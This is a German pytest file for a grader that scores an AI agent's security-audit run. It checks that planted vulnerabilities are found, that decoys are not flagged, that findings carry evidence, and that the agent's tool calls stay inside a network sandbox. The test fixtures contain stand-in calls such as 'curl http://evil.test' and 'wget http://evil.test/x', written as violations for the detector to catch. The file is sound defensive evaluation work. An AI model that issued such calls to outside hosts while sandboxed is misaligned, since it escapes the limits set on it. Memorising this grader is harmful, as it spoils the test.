"""Tests für evals/auswertung.py (TF1-D8): reine Funktionen auf präparierten Berichten und Streams.

Aufruf: python3 -m pytest security-audit/evals/test_auswertung.py -q
Testdaten liegen in evals/testdaten/ (handgeschrieben, nur evil.test und fixture.invalid als fremde Hosts).
"""
import copy
import json
import os
import random
import re
import shutil
import signal
import string
import subprocess
import sys
import tempfile
import time
import unicodedata

import pytest

HIER = os.path.dirname(os.path.abspath(__file__))
sys.path.insert(0, HIER)
import auswertung  # noqa: E402
import run_eval  # noqa: E402

TESTDATEN = os.path.join(HIER, "testdaten")
SKILL = os.path.dirname(HIER)
POC = "python3 /skill/security-audit/scripts/poc.py"
MUSTER = ["fixture.invalid"]


def _json(pfad):
    with open(pfad, encoding="utf-8") as f:
        return json.load(f)


@pytest.fixture
def erwartung():
    return _json(os.path.join(HIER, "expected", "fixture-web.json"))


@pytest.fixture
def bericht():
    return _json(os.path.join(TESTDATEN, "bericht_ok.json"))


@pytest.fixture
def stream():
    return auswertung.lade_stream(os.path.join(TESTDATEN, "stream_ok.jsonl"))[0]


def befund(bericht, datei):
    return [b for b in bericht["befunde"] if b["datei"] == datei][0]


def ohne(bericht, datei):
    bericht["befunde"] = [b for b in bericht["befunde"] if b["datei"] != datei]
    return bericht


def tool_use(i, name, eingabe, parent=None):
    return {"type": "assistant", "parent_tool_use_id": parent,
            "message": {"content": [{"type": "tool_use", "id": i, "name": name, "input": eingabe}]}}


def bash(i, befehl, parent=None):
    return tool_use(i, "Bash", {"command": befehl}, parent)


# ------------------------------------------------------------------------------------ Zuordnung

def test_zuordnung(bericht, erwartung):
    z = auswertung.befunde_zuordnen(bericht, erwartung)
    assert set(z) == {e["id"] for e in erwartung["eintraege"]}
    assert [b["id"] for b in z["L1"]] == ["S-1"]
    assert [b["id"] for b in z["K2"]] == ["S-8"]


def test_zuordnung_kategorie_und_pfad(bericht, erwartung):
    befund(bericht, "src/routes/search.js")["kategorie"] = "A09"             # Kategorie nicht in L2
    befund(bericht, "src/routes/projects.js")["datei"] = "./src/routes/projects.js"  # normalisiert
    befund(bericht, "src/routes/webhook.js")["datei"] = None                 # repo-weit: passt nirgends
    z = auswertung.befunde_zuordnen(bericht, erwartung)
    assert z["L2"] == []
    assert [b["id"] for b in z["L1"]] == ["S-1"]
    assert z["L4"] == []


# ------------------------------------------------------------------------------------ Recall

def test_recall_ok(bericht, erwartung):
    assert auswertung.pruefe_recall(bericht, erwartung) == []


def test_recall_fehlende_p1(bericht, erwartung):
    fehler = auswertung.pruefe_recall(ohne(bericht, "src/routes/projects.js"), erwartung)
    assert fehler and any("L1" in f for f in fehler)


def test_recall_p1_als_p2(bericht, erwartung):
    befund(bericht, "src/routes/search.js")["stufe"] = "P2"
    fehler = auswertung.pruefe_recall(bericht, erwartung)
    assert any("L2" in f for f in fehler)


def test_recall_5_von_6(bericht, erwartung):
    assert auswertung.pruefe_recall(ohne(bericht, "src/routes/download.js"), erwartung) == []


def test_recall_4_von_6(bericht, erwartung):
    ohne(bericht, "src/routes/download.js")
    ohne(bericht, "src/routes/preview.js")
    fehler = auswertung.pruefe_recall(bericht, erwartung)
    assert fehler and any("4 von 6" in f for f in fehler)


def test_recall_verworfen_zaehlt_nicht(bericht, erwartung):
    b = befund(bericht, "src/routes/projects.js")
    b["status"] = "verworfen"
    assert any("L1" in f for f in auswertung.pruefe_recall(bericht, erwartung))


def test_recall_status_nfd(bericht, erwartung):
    for b in bericht["befunde"]:
        b["status"] = unicodedata.normalize("NFD", b["status"])
    assert auswertung.pruefe_recall(bericht, erwartung) == []
    assert auswertung.pruefe_koeder(bericht, erwartung) == []
    assert auswertung.pruefe_status(bericht) == []


def test_recall_ohne_befunde(erwartung):
    assert auswertung.pruefe_recall({"befunde": []}, erwartung)
    assert auswertung.pruefe_recall({}, erwartung)


# ------------------------------------------------------------------------------------ Köder

def test_koeder_ok(bericht, erwartung):
    assert auswertung.pruefe_koeder(bericht, erwartung) == []


def test_koeder_als_p1(bericht, erwartung):
    b = befund(bericht, "src/routes/reports.js")
    b.update(stufe="P1", status="bestätigt", poc=f"{POC} anfrage --pfad /reports")
    fehler = auswertung.pruefe_koeder(bericht, erwartung)
    assert any("K1" in f for f in fehler)


def test_koeder_als_p2(bericht, erwartung):
    b = befund(bericht, "src/routes/avatar.js")
    b.update(stufe="P2", status="unbestätigt", code_pfad=["a.js:1", "b.js:2"])
    fehler = auswertung.pruefe_koeder(bericht, erwartung)
    assert any("K3" in f for f in fehler)


def test_koeder_p3_unbestaetigt_ok(bericht, erwartung):
    b = befund(bericht, "src/routes/avatar.js")
    b.update(stufe="P3", status="unbestätigt", code_pfad=["a.js:1", "b.js:2"])
    assert auswertung.pruefe_koeder(bericht, erwartung) == []


def test_koeder_verworfen_mit_grund(bericht, erwartung):
    assert befund(bericht, "src/routes/invoices.js")["status"] == "verworfen"
    assert auswertung.pruefe_koeder(bericht, erwartung) == []


@pytest.mark.parametrize("grund", [None, "", "   "])
def test_koeder_verworfen_ohne_grund(bericht, erwartung, grund):
    b = befund(bericht, "src/routes/invoices.js")
    if grund is None:
        del b["grund"]
    else:
        b["grund"] = grund
    fehler = auswertung.pruefe_koeder(bericht, erwartung)
    assert any("K2" in f and "grund" in f.lower() for f in fehler)


def test_koeder_und_luecke_gleiche_kategorie(bericht, erwartung):
    """A01 in invoices.js (Köder K2) und in projects.js (Lücke L1): Köder-Fehler, Lücke trotzdem gefunden."""
    bericht = ohne(bericht, "src/routes/invoices.js")
    bericht["befunde"].append({**befund(bericht, "src/routes/projects.js"), "id": "S-20",
                               "datei": "src/routes/invoices.js", "kategorie": "A01"})
    assert any("K2" in f for f in auswertung.pruefe_koeder(bericht, erwartung))
    assert auswertung.pruefe_recall(bericht, erwartung) == []
    z = auswertung.befunde_zuordnen(bericht, erwartung)
    assert [b["id"] for b in z["L1"]] == ["S-1"]
    assert [b["id"] for b in z["K2"]] == ["S-20"]


# ------------------------------------------------------------------------------------ Status

def test_status_ok(bericht):
    assert auswertung.pruefe_status(bericht) == []


def test_status_bestaetigt_ohne_poc(bericht):
    del befund(bericht, "src/routes/projects.js")["poc"]
    fehler = auswertung.pruefe_status(bericht)
    assert any("S-1" in f and "poc" in f for f in fehler)


def test_status_bestaetigt_leerer_poc(bericht):
    befund(bericht, "src/routes/projects.js")["poc"] = "  "
    assert any("S-1" in f for f in auswertung.pruefe_status(bericht))


def test_status_unbestaetigt_kurzer_code_pfad(bericht):
    befund(bericht, "src/routes/admin.js")["code_pfad"] = ["src/a.js:3"]
    fehler = auswertung.pruefe_status(bericht)
    assert any("S-3" in f and "code_pfad" in f for f in fehler)


def test_status_unbestaetigt_ohne_code_pfad(bericht):
    del befund(bericht, "src/routes/admin.js")["code_pfad"]
    assert any("S-3" in f for f in auswertung.pruefe_status(bericht))


def test_status_verworfen_und_p3_brauchen_nichts(bericht):
    # S-7 (verworfen) hat weder poc noch code_pfad; ein verdacht-P1 ebenso
    bericht["befunde"].append({"id": "S-30", "stufe": "P1", "status": "verdacht", "datei": "src/x.js"})
    bericht["befunde"].append({"id": "S-31", "stufe": "P3", "status": "unbestätigt", "datei": "src/y.js"})
    assert auswertung.pruefe_status(bericht) == []


# ------------------------------------------------------------------------------------ Netz

def test_netz_ok(stream, bericht):
    assert auswertung.pruefe_netz(stream, bericht, MUSTER) == []


def test_netz_curl_localhost(bericht):
    fehler = auswertung.pruefe_netz([bash("a", "curl http://localhost:3000")], bericht, MUSTER)
    assert fehler


def test_netz_poc_ssrf_payload_ok(bericht):
    befehl = f"{POC} anfrage --lauf 0a1b2c3d --rolle p1 --pfad /x?url=http://127.0.0.1/"
    assert auswertung.pruefe_netz([bash("a", befehl)], bericht, MUSTER) == []


def test_netz_abgelehnter_tool_use(bericht):
    """Ein abgelehnter Aufruf erscheint im Stream als tool_use; die Ablehnung kommt später als tool_result."""
    events = [bash("a", "echo http://fixture.invalid/x"),
              {"type": "user", "message": {"content": [{"type": "tool_result", "tool_use_id": "a",
                                                        "is_error": True, "content": "denied"}]}}]
    fehler = auswertung.pruefe_netz(events, bericht, MUSTER)
    assert fehler and any("fixture.invalid" in f for f in fehler)


def test_netz_subagent_verstoss(bericht):
    events = [tool_use("a", "Agent", {"prompt": "x"}),
              bash("b", "wget http://evil.test/x", parent="a")]
    fehler = auswertung.pruefe_netz(events, bericht, MUSTER)
    assert fehler and any("Subagent" in f for f in fehler)


def test_netz_grep_mit_fixture_invalid_ok(bericht):
    events = [tool_use("a", "Grep", {"pattern": "fixture.invalid"}),
              tool_use("b", "Read", {"file_path": "/x/fixture.invalid"})]
    assert auswertung.pruefe_netz(events, bericht, MUSTER) == []


def test_netz_verbotenes_muster_in_bash(bericht):
    fehler = auswertung.pruefe_netz([bash("a", "ls /tmp/fixture.invalid")], bericht, MUSTER)
    assert any("Muster" in f for f in fehler)


def test_netz_zusammengesetzter_poc_aufruf(bericht):
    befehl = f"{POC} anfrage --pfad /x && curl http://127.0.0.1:3000"
    assert auswertung.pruefe_netz([bash("a", befehl)], bericht, MUSTER)


def test_netz_poc_im_bericht(bericht):
    befund(bericht, "src/routes/preview.js")["poc"] = f"{POC} anfrage --pfad /p?url=http%3A%2F%2Fdb.fixture.invalid"
    fehler = auswertung.pruefe_netz([], bericht, MUSTER)
    assert fehler and any("S-5" in f for f in fehler)


def test_netz_bericht_none(stream):
    assert auswertung.pruefe_netz(stream, None, MUSTER) == []
    assert auswertung.pruefe_netz([bash("a", "curl http://evil.test")], None, MUSTER)


def test_netz_dedup_und_defekte_ereignisse(bericht):
    events = [bash("a", "curl http://evil.test"), bash("a", "curl http://evil.test"),
              {"type": "assistant", "message": "kein dict"}, {"type": "assistant"},
              {"type": "assistant", "message": {"content": None}},
              tool_use("c", "Bash", {"command": None}), tool_use("d", "Bash", "kein dict")]
    fehler = auswertung.pruefe_netz(events, bericht, MUSTER)
    assert len(fehler) == 1


# ------------------------------------------------------------------------------------ Subagenten und Stream

def test_subagenten():
    events = [tool_use(f"a{i}", "Agent", {}) for i in range(6)] + [tool_use(f"t{i}", "Task", {}) for i in range(2)]
    events.append(tool_use("b1", "Bash", {"command": "ls"}))
    assert auswertung.zaehle_subagenten(events) == 8


def test_subagenten_dedup():
    events = [tool_use("a1", "Agent", {}), tool_use("a1", "Agent", {}), tool_use("a2", "Task", {})]
    assert auswertung.zaehle_subagenten(events) == 2


def test_subagenten_aus_datei(stream):
    assert auswertung.zaehle_subagenten(stream) == 2


def test_lade_stream():
    events, uebersprungen = auswertung.lade_stream(os.path.join(TESTDATEN, "stream_ok.jsonl"))
    assert uebersprungen == 0 and len(events) == 8


def test_stream_abgeschnitten():
    events, uebersprungen = auswertung.lade_stream(os.path.join(TESTDATEN, "stream_abgeschnitten.jsonl"))
    assert uebersprungen == 2                           # "not json" und die halbe letzte Zeile; Leerzeile zählt nicht
    assert len(events) == 3
    assert auswertung.zaehle_subagenten(events) == 2
    assert auswertung.pruefe_netz(events, None, MUSTER) == []


def test_stream_nicht_objekt_und_kaputtes_utf8(tmp_path):
    p = tmp_path / "s.jsonl"
    p.write_bytes(b'[1,2]\n"text"\n{"type":"x"}\n\xff\xfe{kaputt\n')
    events, uebersprungen = auswertung.lade_stream(str(p))
    assert events == [{"type": "x"}] and uebersprungen == 3


# ------------------------------------------------------------------------------------ Ablage, Docker

def test_ablage_ok():
    assert auswertung.pruefe_ablage("", ["2026-11-10-abc1234.md", "2026-11-10-abc1234.json",
                                         "2026-11-10-abc1234-agent-stats.md"], [], []) == []


def test_ablage_fehler():
    ok = ["x.md", "x.json", "x-agent-stats.md"]
    assert any("git" in f.lower() for f in auswertung.pruefe_ablage(" M src/a.js\n?? neu.txt\n", ok, [], []))
    assert auswertung.pruefe_ablage("\n", ok, [], []) == []
    assert any(".json" in f for f in auswertung.pruefe_ablage("", ["x.md", "x-agent-stats.md"], [], []))
    assert any("agent-stats" in f for f in auswertung.pruefe_ablage("", ["x.md", "x.json"], [], []))
    assert any(".md" in f for f in auswertung.pruefe_ablage("", ["x.json", "x-agent-stats.md"], [], []))
    assert auswertung.pruefe_ablage("", [], [], [])
    assert any("security-reviews" in f for f in auswertung.pruefe_ablage("", ok, ["2026-11-10-andere.md"], []))
    assert any("agent-stats" in f for f in auswertung.pruefe_ablage("", ok, [], ["eval-security-audit-1/x.md"]))


def test_ablage_stats_zaehlt_nicht_als_bericht():
    assert auswertung.pruefe_ablage("", ["x.json", "x-agent-stats.md", "x-agent-stats.md"], [], [])


def test_docker_leer():
    assert auswertung.pruefe_docker_leer([], [], []) == []
    fehler = auswertung.pruefe_docker_leer(["security-audit-ab12cd34-p1-app"], ["security-audit-ab12cd34"],
                                           ["security-audit-ab12cd34-p1:latest"])
    assert len(fehler) == 3
    assert any("Container" in f for f in fehler) and any("Netz" in f for f in fehler) \
        and any("Image" in f for f in fehler)
    assert auswertung.pruefe_docker_leer([""], ["  "], []) == []


# ------------------------------------------------------------------------------------ auswerten

def alles(bericht, erwartung, stream, **ueberschreibe):
    args = dict(bericht=bericht, erwartung=erwartung, stream=stream, porcelain="",
                ausgabe_dateien=["x.md", "x.json", "x-agent-stats.md"], neue_reviews=[], neue_stats=[],
                docker_listen={"container": [], "netze": [], "images": []})
    args.update(ueberschreibe)
    return auswertung.auswerten(**args)


def test_auswerten_ok(bericht, erwartung, stream):
    ergebnis = alles(bericht, erwartung, stream)
    assert ergebnis["ok"] is True
    assert set(ergebnis["dod"]) == {f"TF1-D{i}" for i in range(1, 8)}
    assert all(d["ok"] and d["details"] == [] for d in ergebnis["dod"].values())
    json.dumps(ergebnis)                                # serialisierbar (ergebnis.json)


def test_auswerten_scheitert(bericht, erwartung, stream):
    ergebnis = alles(ohne(bericht, "src/routes/projects.js"), erwartung, stream)
    assert ergebnis["ok"] is False
    assert ergebnis["dod"]["TF1-D1"]["ok"] is False
    assert any("L1" in d for d in ergebnis["dod"]["TF1-D1"]["details"])
    assert ergebnis["dod"]["TF1-D2"]["ok"] is True


def test_auswerten_koeder(bericht, erwartung, stream):
    befund(bericht, "src/routes/reports.js").update(stufe="P1", status="bestätigt", poc=f"{POC} anfrage")
    ergebnis = alles(bericht, erwartung, stream)
    assert ergebnis["ok"] is False
    assert ergebnis["dod"]["TF1-D2"]["ok"] is False


def test_auswerten_bericht_none(erwartung, stream):
    ergebnis = alles(None, erwartung, stream)
    assert ergebnis["ok"] is False
    for d in ("TF1-D1", "TF1-D2", "TF1-D3", "TF1-D5"):
        assert ergebnis["dod"][d]["ok"] is False
        assert "kein Bericht" in ergebnis["dod"][d]["details"]
    for d in ("TF1-D4", "TF1-D6", "TF1-D7"):
        assert ergebnis["dod"][d]["ok"] is True


def test_auswerten_netz_bericht_none_meldet_stream_verstoss(erwartung):
    ergebnis = alles(None, erwartung, [bash("a", "curl http://evil.test")])
    d5 = ergebnis["dod"]["TF1-D5"]
    assert d5["ok"] is False and "kein Bericht" in d5["details"] and len(d5["details"]) > 1


def test_auswerten_zu_viele_subagenten(bericht, erwartung):
    events = [tool_use(f"a{i}", "Agent", {}) for i in range(9)]
    ergebnis = alles(bericht, erwartung, events)
    assert ergebnis["ok"] is False
    assert ergebnis["dod"]["TF1-D6"]["ok"] is False and "9" in ergebnis["dod"]["TF1-D6"]["details"][0]
    assert alles(bericht, erwartung, events[:8])["dod"]["TF1-D6"]["ok"] is True


def test_auswerten_ablage_und_docker(bericht, erwartung, stream):
    e = alles(bericht, erwartung, stream, porcelain="?? x\n")
    assert e["dod"]["TF1-D4"]["ok"] is False and e["ok"] is False
    e = alles(bericht, erwartung, stream, docker_listen={"container": ["security-audit-1"], "netze": [], "images": []})
    assert e["dod"]["TF1-D7"]["ok"] is False and e["ok"] is False


def test_auswerten_docker_listen_unvollstaendig(bericht, erwartung, stream):
    """Fehlender Schlüssel in docker_listen ist ein Fehler (fail-closed), kein stilles Durchlassen."""
    e = alles(bericht, erwartung, stream, docker_listen={"container": []})
    assert e["dod"]["TF1-D7"]["ok"] is False


def test_unveraendert(bericht, erwartung, stream):
    """Die Auswertung verändert ihre Eingaben nicht."""
    vorher = copy.deepcopy((bericht, erwartung, stream))
    alles(bericht, erwartung, stream)
    assert (bericht, erwartung, stream) == vorher


# ------------------------------------------------------------------------------------ Fix-Runde 1 (T5)

def test_stream_unicode_zeilentrenner(tmp_path):
    """I1: U+2028, U+2029, U+0085 (und \\x1c-\\x1e) im Befehl zerlegen das Ereignis nicht."""
    befehl = "ls  \u0085\x1c\x1d\x1e curl http://evil.test/x"
    p = tmp_path / "s.jsonl"
    p.write_text(json.dumps(bash("a", befehl), ensure_ascii=False) + "\r\n", encoding="utf-8")
    events, uebersprungen = auswertung.lade_stream(str(p))
    assert len(events) == 1 and uebersprungen == 0
    assert auswertung.pruefe_netz(events, None, MUSTER)


def test_poc_gegen_verbotene_muster(bericht):
    """I2: poc mit Muster im Header oder im Antworttext (auch URL-kodiert) ist ein Verstoß."""
    b = befund(bericht, "src/routes/projects.js")
    b["poc"] = f"{POC} anfrage --pfad /x --header 'X-Target: fixture.invalid'"
    assert any("S-1" in f and "Muster" in f for f in auswertung.pruefe_netz([], bericht, MUSTER))
    b["poc"] = f"{POC} anfrage --pfad /x\nAntwort: Treffer db.fixture.invalid"
    assert any("S-1" in f for f in auswertung.pruefe_netz([], bericht, MUSTER))
    b["poc"] = f"{POC} anfrage --pfad /x?h=fixture%2Einvalid"
    assert any("S-1" in f for f in auswertung.pruefe_netz([], bericht, MUSTER))


def test_leerer_stream(bericht, erwartung):
    """I3: Kein Stream darf D5 und D6 nicht bestehen."""
    e = alles(bericht, erwartung, [])
    assert e["ok"] is False
    for d in ("TF1-D5", "TF1-D6"):
        assert e["dod"][d]["ok"] is False and "kein Stream" in e["dod"][d]["details"]
    assert e["dod"]["TF1-D1"]["ok"] is True


def test_stream_uebersprungen_macht_d5_rot(bericht, erwartung, stream):
    """I3b: Übersprungene Zeilen mitten im Stream könnten einen Verstoß verbergen: D5 rot."""
    e = alles(bericht, erwartung, stream, stream_uebersprungen=2, stream_nur_letzte=False)
    assert e["ok"] is False and e["dod"]["TF1-D5"]["ok"] is False
    assert any("2 Stream-Zeilen" in d for d in e["dod"]["TF1-D5"]["details"])
    assert e["dod"]["TF1-D6"]["ok"] is True
    assert alles(bericht, erwartung, stream)["dod"]["TF1-D5"]["details"] == []
    # nur_letzte gilt nur für genau eine Zeile
    assert alles(bericht, erwartung, stream, stream_uebersprungen=2, stream_nur_letzte=True)["ok"] is False
    assert alles(bericht, erwartung, stream, stream_uebersprungen=1)["dod"]["TF1-D5"]["ok"] is False


def test_stream_nur_letzte_zeile_ist_hinweis(bericht, erwartung, stream):
    e = alles(bericht, erwartung, stream, stream_uebersprungen=1, stream_nur_letzte=True)
    assert e["ok"] is True
    for d in ("TF1-D5", "TF1-D6"):
        assert any("letzte Stream-Zeile" in x for x in e["dod"][d]["details"])


def test_lade_stream_info_nur_letzte(tmp_path):
    zeile = json.dumps(bash("a", "ls"))
    def lade(inhalt):
        p = tmp_path / "s.jsonl"
        p.write_text(inhalt, encoding="utf-8")
        return auswertung.lade_stream_info(str(p))
    assert lade(f"{zeile}\n{zeile[:20]}") == ([bash("a", "ls")], 1, True, zeile[:20])
    assert lade(f"{zeile}\n{zeile[:20]}\n\n") == ([bash("a", "ls")], 1, True, zeile[:20])  # Leerzeilen danach
    assert lade(f"{zeile[:20]}\n{zeile}\n")[1:] == (1, False, "")                  # Zeile mitten im Stream
    assert lade(f"nix\n{zeile}\n{zeile[:20]}")[1:] == (2, False, "")
    assert lade(f"{zeile}\n")[1:] == (0, False, "")
    events, n, nur, _ = auswertung.lade_stream_info(os.path.join(TESTDATEN, "stream_abgeschnitten.jsonl"))
    assert (len(events), n, nur) == (3, 2, False)                                  # "not json" und halbe letzte


def test_schema_gate(bericht, erwartung, stream):
    """I4: Schemafehler machen D3 rot."""
    del bericht["befunde"][0]["titel"]
    e = alles(bericht, erwartung, stream)
    assert e["dod"]["TF1-D3"]["ok"] is False and any("Schema" in d for d in e["dod"]["TF1-D3"]["details"])
    assert e["ok"] is False
    e = alles({"befunde": []}, erwartung, stream)
    assert e["dod"]["TF1-D3"]["ok"] is False


KOEDER_PFADE = ["src/routes/../routes/invoices.js", "src//routes/invoices.js", "src\\routes\\invoices.js",
                "/work/src/routes/invoices.js", "./src/routes/invoices.js", "Src/Routes/Invoices.js",
                "src/routes/in​voices.js", "src/routes/invoices.js/", "src/./routes/invoices.js"]


@pytest.mark.parametrize("pfad", KOEDER_PFADE)
def test_koeder_pfad_normalisierung(bericht, erwartung, pfad):
    befund(bericht, "src/routes/invoices.js").update(datei=pfad, stufe="P1", status="bestätigt",
                                                    poc=f"{POC} anfrage")
    assert any("K2" in f for f in auswertung.pruefe_koeder(bericht, erwartung))


def test_koeder_absoluter_pfad_andere_datei(bericht, erwartung):
    """Kein Fehlalarm: `/work/src/routes/myinvoices.js` endet nicht auf `/<Köder-Datei>`."""
    befund(bericht, "src/routes/invoices.js").update(datei="/work/src/routes/myinvoices.js", stufe="P1",
                                                    status="bestätigt")
    assert not any("K2" in f for f in auswertung.pruefe_koeder(bericht, erwartung))


@pytest.mark.parametrize("status,stufe", [("Bestätigt", "P1"), ("bestätigt ", "P1"), ("bestätigt", "p1"),
                                          ("bestätigt", None), ("bestätigt", "P2"), ("unbekannt", "P3"),
                                          ("unbestätigt", "P2"), (None, "P1"), ("Bestätigt", "P1 ")])
def test_koeder_fail_closed(bericht, erwartung, status, stufe):
    befund(bericht, "src/routes/reports.js").update(status=status, stufe=stufe)
    assert any("K1" in f for f in auswertung.pruefe_koeder(bericht, erwartung))


def test_koeder_verworfen_und_verdacht_lose(bericht, erwartung):
    befund(bericht, "src/routes/reports.js").update(status=" Verworfen ", stufe=None)
    b = befund(bericht, "src/routes/avatar.js")
    b.update(status="verdacht", stufe="P1")
    b.pop("grund")
    assert auswertung.pruefe_koeder(bericht, erwartung) == []


def test_koeder_status_nfd(bericht, erwartung):
    befund(bericht, "src/routes/avatar.js").update(status=unicodedata.normalize("NFD", "unbestätigt"), stufe="P3")
    assert auswertung.pruefe_koeder(bericht, erwartung) == []


def test_recall_pfad_mit_punkten(bericht, erwartung):
    befund(bericht, "src/routes/projects.js")["datei"] = "src/routes/../routes/projects.js"
    assert auswertung.pruefe_recall(bericht, erwartung) == []
    assert [b["id"] for b in auswertung.befunde_zuordnen(bericht, erwartung)["L1"]] == ["S-1"]


def test_recall_absoluter_pfad_zaehlt_nicht(bericht, erwartung):
    befund(bericht, "src/routes/projects.js")["datei"] = "/work/src/routes/projects.js"
    assert any("L1" in f for f in auswertung.pruefe_recall(bericht, erwartung))


def test_erwartung_leer(bericht, erwartung, stream):
    """I5: Leere Erwartung besteht nicht."""
    leer = {**erwartung, "eintraege": []}
    e = alles(bericht, leer, stream)
    for d in ("TF1-D1", "TF1-D2"):
        assert e["dod"][d]["ok"] is False and any("Erwartung leer" in x for x in e["dod"][d]["details"])
    assert e["ok"] is False
    ohne_muster = {k: v for k, v in erwartung.items() if k != "verbotene_muster"}
    e = alles(bericht, ohne_muster, stream)
    assert e["dod"]["TF1-D5"]["ok"] is False and any("Erwartung leer" in x for x in e["dod"]["TF1-D5"]["details"])
    e = alles(bericht, {**erwartung, "verbotene_muster": []}, stream)
    assert e["dod"]["TF1-D5"]["ok"] is False
    e = alles(None, leer, stream)
    assert any("Erwartung leer" in x for x in e["dod"]["TF1-D1"]["details"])


def test_recall_nur_verdacht(bericht, erwartung):
    """M3: Eine Lücke nur als verdacht gilt nicht als gefunden."""
    befund(bericht, "src/routes/projects.js").update(status="verdacht")
    assert any("L1" in f for f in auswertung.pruefe_recall(bericht, erwartung))
    befund(bericht, "src/routes/download.js").update(status="verdacht")
    assert any("von 6" in f for f in auswertung.pruefe_recall(bericht, erwartung))


def test_status_p2_ohne_beleg(bericht):
    """M9: P2 bestätigt ohne poc, P2 unbestätigt mit 1-Schritt-code_pfad."""
    del befund(bericht, "src/routes/preview.js")["poc"]
    befund(bericht, "src/routes/download.js")["code_pfad"] = ["src/a.js:1"]
    fehler = auswertung.pruefe_status(bericht)
    assert any("S-5" in f for f in fehler) and any("S-6" in f for f in fehler)


def test_netz_gleiche_id_zweiter_befehl_verstoss(bericht):
    """M12: gleiche id, anderer Befehl: der zweite Verstoß wird erkannt."""
    events = [bash("a", "ls"), bash("a", "curl http://evil.test/x")]
    assert auswertung.pruefe_netz(events, bericht, MUSTER)


def test_auswerten_grep_per_bash(bericht, erwartung):
    """M21: `grep -rn fixture.invalid src` per Bash verletzt D5."""
    e = alles(bericht, erwartung, [bash("a", "grep -rn fixture.invalid src")])
    assert e["dod"]["TF1-D5"]["ok"] is False and e["ok"] is False


def test_netz_tool_use_in_user_und_verschachtelt(bericht):
    """M-1: tool_use-Blöcke in jedem Ereignistyp, in Listen und Dicts, werden gefunden."""
    block = {"type": "tool_use", "id": "u1", "name": "Bash", "input": {"command": "curl http://evil.test"}}
    for ereignis in ({"type": "user", "message": {"content": [block]}},
                     {"type": "user", "message": {"content": block}},
                     {"type": "result", "daten": {"tiefer": [[{"x": block}]]}},
                     {"message": {"content": [{"type": "tool_result", "content": [block]}]}}):
        assert auswertung.pruefe_netz([ereignis], bericht, MUSTER), ereignis
    agent = {"type": "user", "message": {"content": [{"type": "tool_use", "id": "g1", "name": "Agent", "input": {}}]}}
    assert auswertung.zaehle_subagenten([agent, agent]) == 1


def test_netz_command_anderer_werkzeugname(bericht):
    """M-2: jedes tool_use mit command-Eingabe (Monitor …) unterliegt der Netzregel."""
    assert auswertung.pruefe_netz([tool_use("m", "Monitor", {"command": "curl http://evil.test"})], bericht, MUSTER)
    assert auswertung.pruefe_netz([tool_use("m", "Monitor", {"command": "ls"})], bericht, MUSTER) == []


def test_netz_url_felder(bericht):
    """M-2: url-Eingaben (WebFetch …) gegen Erlaubtliste und Muster; Web-Werkzeuge selbst sind ein Verstoß."""
    assert auswertung.pruefe_netz([tool_use("w", "WebFetch", {"url": "https://evil.test/x"})], bericht, MUSTER)
    assert auswertung.pruefe_netz([tool_use("w", "WebFetch", {"url": "http://127.0.0.1:3000/"})], bericht, MUSTER)
    assert auswertung.pruefe_netz([tool_use("w", "WebSearch", {"query": "x"})], bericht, MUSTER)
    assert auswertung.pruefe_netz([tool_use("w", "Fetcher", {"url": "evil.test/x"})], bericht, MUSTER)
    assert auswertung.pruefe_netz([tool_use("w", "Fetcher", {"url": "http://localhost/?q=fixture.invalid"})],
                                  bericht, MUSTER)
    assert auswertung.pruefe_netz([tool_use("w", "Fetcher", {"url": "http://localhost:3000/"})], bericht, MUSTER) == []


def test_netz_url_mit_fremdem_host_macht_d5_rot_r1_6(bericht):
    """R1-6: Hostprüfung der `url`-Eingabe selbst (Werkzeugname unverdächtig, kein verbotenes Muster in der URL)."""
    fehler = auswertung.pruefe_netz([tool_use("w", "Fetcher", {"url": "https://evil.test/x"})], bericht, MUSTER)
    assert any("evil.test" in f and "url" in f for f in fehler), fehler
    assert auswertung.pruefe_netz([tool_use("w", "Fetcher", {"url": "http://app:3000/x"})], bericht, MUSTER) == []


# ------------------------------------------------------------------------------------ Fix-Runde 2 (T5-R2)

KOEDER_VARIANTEN = ["src/routes/invoices.js:42", "src/routes/invoices.js:42:7", "src/routes/invoices.js#L4",
                    "src/routes/invoices.js#L4-L9", "src/routes/invoices.js#L4-9", "routes/invoices.js",
                    "invoices.js", "ｓｒｃ/routes/invoices.js", "src/routes/invoices.js :42",
                    "/work/src/routes/invoices.js:42"]


@pytest.mark.parametrize("pfad", KOEDER_VARIANTEN)
def test_koeder_pfad_varianten(bericht, erwartung, pfad):
    """M-1: Zeilenangaben, verkürzte Pfade und Fullwidth entgehen der Köder-Zuordnung nicht."""
    befund(bericht, "src/routes/invoices.js").update(datei=pfad, stufe="P1", status="bestätigt",
                                                    poc=f"{POC} anfrage")
    assert any("K2" in f for f in auswertung.pruefe_koeder(bericht, erwartung))


def test_koeder_verkuerzter_pfad_andere_datei(bericht, erwartung):
    befund(bericht, "src/routes/invoices.js").update(datei="voices.js", stufe="P1", status="bestätigt")
    assert not any("K2" in f for f in auswertung.pruefe_koeder(bericht, erwartung))


@pytest.mark.parametrize("pfad", ["src/routes/projects.js:12", "src/routes/projects.js#L3-L8",
                                  "ｓｒｃ/routes/projects.js:12:3"])
def test_recall_zeilenangabe(bericht, erwartung, pfad):
    befund(bericht, "src/routes/projects.js")["datei"] = pfad
    assert auswertung.pruefe_recall(bericht, erwartung) == []


def test_recall_verkuerzter_pfad_zaehlt_nicht(bericht, erwartung):
    befund(bericht, "src/routes/projects.js")["datei"] = "projects.js"
    assert any("L1" in f for f in auswertung.pruefe_recall(bericht, erwartung))


def test_verbotene_muster_casefold(bericht):
    """M-2: Groß-/Kleinschreibung umgeht verbotene Muster weder in Bash noch in poc noch in url."""
    assert auswertung.pruefe_netz([bash("a", "echo FIXTURE.INVALID")], bericht, MUSTER)
    befund(bericht, "src/routes/projects.js")["poc"] = f"{POC} anfrage --pfad /x?h=db.Fixture.Invalid"
    assert any("S-1" in f for f in auswertung.pruefe_netz([], bericht, MUSTER))
    assert auswertung.pruefe_netz([tool_use("w", "Fetcher", {"url": "http://localhost/?q=Fixture.INVALID"})],
                                  ohne(bericht, "src/routes/projects.js"), MUSTER)
    assert auswertung.pruefe_netz([bash("a", "echo ok")], bericht, ["FIXTURE.invalid"]) == []
    assert auswertung.pruefe_netz([bash("a", "echo fixture.invalid")], bericht, ["FIXTURE.invalid"])


def test_zu_tief_verschachtelt(bericht):
    """M-3: Ein Ereignis, das zu tief verschachtelt ist, ist ein D5-Fehler und kein stilles Abbrechen."""
    wert = {"type": "tool_use", "id": "x", "name": "Bash", "input": {"command": "curl http://evil.test"}}
    for _ in range(60):
